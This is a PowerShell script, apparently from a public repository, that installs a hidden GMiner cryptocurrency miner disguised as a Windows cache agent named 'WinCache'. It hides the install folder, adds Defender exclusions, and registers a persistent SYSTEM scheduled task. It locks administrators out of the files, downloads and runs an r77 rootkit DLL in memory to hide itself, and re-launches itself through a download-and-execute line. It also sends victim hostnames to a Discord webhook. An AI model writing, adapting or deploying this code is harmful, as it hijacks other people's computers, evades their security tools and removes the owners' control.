#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
    Includes Safe Update, File Protection (Admin Lockout), and r77 Rootkit.
.EXAMPLE
    .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    iex "& { $(irm 'URL_DEL_SCRIPT') } -Diagnose"
.EXAMPLE
    .\Mine.ps1 -Uninstall
#>
[CmdletBinding()]
param(
    [string]$Wallet,
    [string]$Pool,
    [string]$Algo,
    [string]$Worker,
    [string]$DiscordWebhook,
    [switch]$Uninstall,
    [switch]$Foreground,
    [switch]$TestWebhook,
    [switch]$Diagnose,
    [switch]$Run,
    [switch]$NoElevate
)
$ErrorActionPreference = 'Stop'

# ---------- paths -----------------------------------------------------------
$RemoteUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1'
$Root      = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
$LogDir    = Join-Path $Root 'logs'
$ExePath   = Join-Path $Root 'WinCache.exe'
$SelfPs    = Join-Path $Root 'WinCache.ps1'
$LogFile   = Join-Path $LogDir 'cache.log'
$TaskName  = 'WinCacheAgent'

$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

# ---------- helpers ---------------------------------------------------------
function Send-DiscordWebhook {
    param([string]$WebhookUrl, [string]$Title, [string]$Message, [int]$Color = 3066993)
    if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
    $payload = [ordered]@{
        embeds = @([ordered]@{ title = $Title; description = $Message; color = $Color; timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") })
    } | ConvertTo-Json -Depth 4 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -ErrorAction Stop | Out-Null
        return $true
    } catch { return $false }
}

function Stop-Safe {
    Write-Host '[*] Deteniendo procesos anteriores...'
    # Matar el minero a la fuerza (por si es propiedad de SYSTEM)
    & taskkill.exe /F /IM WinCache.exe /T 2>&1 | Out-Null
    
    # Matar el Watcher de PowerShell
    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
    foreach ($w in $watchers) {
        & taskkill.exe /F /PID $w.ProcessId /T 2>&1 | Out-Null
    }
    Start-Sleep -Seconds 2
}

function Force-Unlock {
    param([string]$Path)
    if (Test-Path $Path) {
        try {
            # Quitar atributo de oculto para que takeown funcione sin problemas
            & attrib.exe -h -s "$Path\*.*" /s /d 2>&1 | Out-Null
            & attrib.exe -h -s $Path /d 2>&1 | Out-Null
            
            $confirm = if ((Get-WinSystemLocale).Name -match '^es') { 'S' } else { 'Y' }
            & takeown.exe /f $Path /r /d $confirm 2>&1 | Out-Null
            
            & icacls.exe $Path /reset /T /C 2>&1 | Out-Null
            & icacls.exe $Path /grant "*S-1-5-32-544:(OI)(CI)F" /T /C 2>&1 | Out-Null
            & icacls.exe $Path /grant "*S-1-5-18:(OI)(CI)F" /T /C 2>&1 | Out-Null
            & icacls.exe $Path /remove:d "*S-1-5-32-544" /T /C 2>&1 | Out-Null
            & icacls.exe $Path /inheritance:e /T /C 2>&1 | Out-Null
        } catch {}
    }
}

function Protect-Files {
    param([string]$Path)
    if ($Path -and (Test-Path $Path)) {
        Write-Host '[*] Aplicando protección de archivos (Solo SYSTEM puede editar)...'
        $filesToProtect = @("$Path\WinCache.exe", "$Path\WinCache.ps1")
        foreach ($file in $filesToProtect) {
            if (Test-Path $file) {
                & icacls.exe $file /inheritance:r 2>&1 | Out-Null
                & icacls.exe $file /grant "*S-1-5-18:(F)" 2>&1 | Out-Null
                & icacls.exe $file /grant "*S-1-5-32-544:(RX)" 2>&1 | Out-Null
                & icacls.exe $file /deny "*S-1-5-32-544:(M,DE)" 2>&1 | Out-Null
            }
        }
        Write-Host '[+] Archivos bloqueados para administradores.'
    }
}

# ---------- test webhook ----------------------------------------------------
if ($TestWebhook) {
    if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
    Write-Host '[*] Enviando embed de prueba...'
    $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)" -Color 3447003
    if ($ok) { Write-Host '[+] Entregado.' } else { Write-Host '[-] Falló.' }
    return
}

# ---------- diagnose --------------------------------------------------------
if ($Diagnose) {
    Write-Host '=================================================='
    Write-Host '  DIAGNÓSTICO DEL SISTEMA (WinCache Agent)'
    Write-Host '=================================================='
    
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host "`n[!] NOTA: Ejecutando sin privilegios de Administrador." -ForegroundColor Yellow
    }

    Write-Host "`n[+] 1. Verificando Tarea Programada..." -ForegroundColor Cyan
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) { 
        Write-Host "    Nombre: $($task.TaskName)"
        Write-Host "    Estado: $($task.State)" 
        if ($task.State -eq 'Running') {
            Write-Host "    [OK] La tarea está corriendo." -ForegroundColor Green
        } else {
            Write-Host "    [!] La tarea está en '$($task.State)'." -ForegroundColor Yellow
            if ($isAdmin) {
                Write-Host "    Intentando iniciarla a la fuerza..." -ForegroundColor Yellow
                try {
                    Start-ScheduledTask -TaskName $TaskName -ErrorAction Stop
                    Write-Host "    [OK] Comando de inicio enviado." -ForegroundColor Green
                    Start-Sleep -Seconds 2
                } catch {
                    Write-Host "    [X] Error al iniciar la tarea: $_" -ForegroundColor Red
                }
            }
        }
    } else { 
        Write-Host "    [!] No se encontró la tarea programada." -ForegroundColor Red 
    }

    Write-Host "`n[+] 2. Verificando Procesos Activos..." -ForegroundColor Cyan
    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
    if ($miners) { 
        foreach ($m in $miners) { Write-Host "    [OK] Miner PID $($m.Id) corriendo." -ForegroundColor Green } 
    } else { 
        Write-Host "    [!] Miner NO está corriendo." -ForegroundColor Yellow 
    }

    Write-Host "`n[+] 3. Verificando Estado del Log (Prueba de Vida)..." -ForegroundColor Cyan
    try {
        if (Test-Path $LogFile) {
            $logInfo = Get-Item $LogFile -ErrorAction Stop
            $timeDiff = (Get-Date) - $logInfo.LastWriteTime
            Write-Host "    Última escritura en el log: $($logInfo.LastWriteTime)"
            if ($timeDiff.TotalMinutes -lt 2) {
                Write-Host "    [OK] El Watcher ESTÁ VIVO (escribió en el log hace $([math]::Round($timeDiff.TotalSeconds)) segundos)." -ForegroundColor Green
            } else {
                Write-Host "    [!] El log no se actualiza hace $([math]::Round($timeDiff.TotalMinutes)) minutos." -ForegroundColor Yellow
            }
        } else {
            Write-Host "    [!] El archivo de log no existe o no tienes permiso." -ForegroundColor Red
        }
    } catch {
        Write-Host "    [!] Acceso denegado al log." -ForegroundColor Yellow
    }

    Write-Host "`n[+] 4. Últimas líneas del Log..." -ForegroundColor Cyan
    try {
        if (Test-Path $LogFile) { 
            Get-Content $LogFile -Tail 10 -ErrorAction Stop | ForEach-Object { Write-Host "    $_" } 
        } 
    } catch {
        Write-Host "    [!] No se pudo leer el log." -ForegroundColor Red
    }

    Write-Host "`n=================================================="
    return
}

# ---------- elevation -------------------------------------------------------
if (-not $Run -and -not $NoElevate -and -not $Diagnose) {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $a = @('-NoProfile','-ExecutionPolicy','Bypass','-Command', "iex ""& { `$(irm '$RemoteUrl') } ")
        foreach ($k in $PSBoundParameters.Keys) {
            if ($k -eq 'NoElevate') { continue }
            $v = $PSBoundParameters[$k]
            if ($v -is [switch]) { if ($v) { $a[3] += "-$k " } }
            else { $a[3] += "-$k '$v' " }
        }
        $a[3] += "-NoElevate"""
        Start-Process powershell -Verb RunAs -ArgumentList $a
        exit
    }
}

# ---------- PREPARACIÓN (POST-ELEVACIÓN) ------------------------------------
if (-not $Run) {
    # 1. Desregistrar tarea para que no reinicie el proceso durante la actualización
    Write-Host '[*] Desregistrando tarea anterior...'
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

    # 2. Detener procesos forzosamente
    Stop-Safe
    
    # 3. Asegurar permisos (quitar bloqueo)
    Write-Host '[*] Asegurando permisos de la carpeta...'
    Force-Unlock -Path $Root
}

# ---------- INICIO DE INSTALACIÓN -------------------------------------------
foreach ($d in @($Root, $LogDir)) { 
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null } 
}
try { 
    $item = Get-Item $Root -Force
    if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) { 
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden 
    } 
} catch {}

try {
    $mp = Get-MpPreference -ErrorAction Stop
    if (@($mp.ExclusionPath) -notcontains $Root) { Add-MpPreference -ExclusionPath $Root }
    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') { Add-MpPreference -ExclusionProcess 'WinCache.exe' }
} catch {}

# 2. DESINSTALACIÓN
if ($Uninstall) {
    Write-Host '[+] Desinstalado correctamente.'
    return
}

# 3. MODO WATCHER
if ($Run) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
    if (-not $Wallet -or -not $Pool -or -not $Algo) { exit 1 }

    function Write-Session {
        param([string]$Msg, [string]$Level = 'INFO')
        Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Msg" -Encoding UTF8
    }

    Write-Session "Watcher iniciado (PID $PID)."

    # --- ROOTKIT ---
    try {
        $bytes = (New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll")  
        $asm = [Reflection.Assembly]::Load($bytes)  
        $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String')  
        $rk.Close()  
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord')  
        $rk.Close()  
        Write-Session "Rootkit r77 cargado y configurado."
    } catch { Write-Session "Error en rootkit: $_" 'WARN' }

    $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
    $argStr = "--algo $Algo --server $Pool --user $Wallet.$Worker"
    $restarts = 0
    $notifiedStart = $false

    while ($true) {
        Write-Session "launching miner (attempt $($restarts + 1))"
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $ExePath; $psi.Arguments = $argStr; $psi.WorkingDirectory = $Root
        $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $psi.CreateNoWindow = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $proc = New-Object System.Diagnostics.Process; $proc.StartInfo = $psi
        
        try {
            $proc.Start() | Out-Null
            try {
                $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
                $rk.SetValue([IO.Path]::GetRandomFileName(), $proc.Id, 'DWord'); $rk.Close()  
            } catch {}

            if (-not $notifiedStart -and $DiscordWebhook) {
                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Protecciones Activadas)*"
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                $notifiedStart = $true
            }
        } catch {
            Write-Session "Fallo al iniciar: $_" 'FATAL'
            break
        }

        $q = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $sub = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action { if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) } } -MessageData $q
        $proc.BeginOutputReadLine()

        while (-not $proc.HasExited -or -not $q.IsEmpty) {
            $line = $null
            if ($q.TryDequeue([ref]$line)) {
                $lvl = if ($line -match $fatalRe) { 'FATAL' } else { 'INFO' }
                Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$lvl] $line" -Encoding UTF8
            } else { Start-Sleep -Milliseconds 200 }
        }

        $proc.WaitForExit()
        Unregister-Event -SourceIdentifier $sub.Name -ErrorAction SilentlyContinue
        $proc.Dispose()
        
        $restarts++
        if ($restarts -ge 10) { break }
        Start-Sleep -Seconds 30
    }
    exit 0
}

# 4. DESCARGA DE GMINER
if (-not (Test-Path $ExePath)) {
    Write-Host '[*] Descargando GMiner...'
    $rel = Invoke-RestMethod -Uri 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest' -Headers @{ 'User-Agent' = 'PowerShell' }
    $asset = $rel.assets | Where-Object { $_.name -match 'windows64\.zip$' } | Select-Object -First 1
    $tmp = Join-Path $env:TEMP ('gc-{0}.zip' -f ([guid]::NewGuid().ToString('N')))
    $stage = Join-Path $env:TEMP ('gc-{0}' -f ([guid]::NewGuid().ToString('N')))
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    Expand-Archive -Path $tmp -DestinationPath $stage -Force
    $inner = Get-ChildItem $stage -Recurse -Filter 'miner.exe' | Select-Object -First 1
    Copy-Item $inner.FullName $ExePath -Force
    Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
}

# 5. HASH DEL WORKER
if ([string]::IsNullOrWhiteSpace($Worker)) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
    $hash = $sha.ComputeHash($bytes); $sha.Dispose()
    $Worker = "rig_$([System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower())"
}

# 6. ACTUALIZACIÓN DEL SCRIPT (TÉCNICA DEL ARCHIVO TEMPORAL)
Write-Host '[*] Guardando nueva versión del script...'
$TempPs = Join-Path $env:TEMP 'WinCache_update.ps1'

if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
    Copy-Item $scriptPath $TempPs -Force
} else {
    Write-Host '[*] Ejecución en memoria detectada. Descargando copia local...'
    Invoke-WebRequest -Uri $RemoteUrl -OutFile $TempPs -UseBasicParsing
}

# Eliminar forzosamente el archivo viejo y mover el nuevo
if (Test-Path $SelfPs) {
    & icacls.exe $SelfPs /grant "*S-1-5-32-544:F" 2>&1 | Out-Null
    Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
}
Copy-Item $TempPs $SelfPs -Force
Remove-Item $TempPs -Force -ErrorAction SilentlyContinue
Unblock-File $SelfPs -ErrorAction SilentlyContinue

$head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }

# 7. CREACIÓN DE LA TAREA PROGRAMADA
Write-Host '[*] Registrando Tarea Programada...'
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
$argList += " -Run -NoElevate"

$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList -WorkingDirectory $Root
$Trigger1 = New-ScheduledTaskTrigger -AtStartup
$Trigger2 = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Hours 0)
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1, $Trigger2 -Settings $Settings -Principal $Principal -Description "WinCache Agent" | Out-Null

# 8. LANZAR EL WATCHER
Write-Host "[+] Iniciando Tarea Programada..."
Start-ScheduledTask -TaskName $TaskName

Start-Sleep -Seconds 3
Protect-Files -Path $Root

if ($DiscordWebhook) {
    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Tarea Instalada, Iniciada y Protegida."
    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Exitosa" -Message $msg -Color 3066993 | Out-Null
}

Write-Host ''
Write-Host '=================================================='
Write-Host '  Instalación completa.'
Write-Host '  Para verificar, usa -Diagnose.'
Write-Host '=================================================='